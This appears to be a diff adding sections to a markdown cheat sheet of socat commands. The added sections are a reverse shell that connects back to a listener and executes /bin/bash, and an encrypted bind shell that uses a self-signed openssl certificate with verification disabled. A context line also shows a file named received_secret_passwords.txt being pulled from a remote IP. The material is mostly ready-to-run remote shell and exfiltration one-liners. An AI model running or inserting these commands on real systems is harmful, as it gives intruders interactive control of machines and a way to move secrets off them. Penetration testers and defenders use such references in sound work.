@@ -47,3 +47,31 @@ Retrieve the above file.
 
 `socat TCP4:<REMOTE IP ADDRESS>:443 file:received_secret_passwords.txt,create`  
 
+## Reverse Shell.  
+
+Set up a listener on 443.  
+
+`socat -d -d TCP4-LISTEN:443 STDOUT`  
+
+Connect back to above listener.  
+
+`socat TCP4:<LISTENER IP>:443 EXEC:/bin/bash`  
+
+## Encrypted Bind Shell.  
+
+Use openssl to create a certificate.  
+
+`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`  
+
+Cat key and cert into a file.  
+
+`cat bind_shell.key bind_shell.crt > bind_shell.pem`  
+
+Set up a listener on 443, ssl verification is turned off.  
+
+`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`  
+
+Connect to listener, using '-' as STDIN and cert verification off.  
+
+`socat - OPENSSL:<LISTENER IP>:443,verify=0`  
+
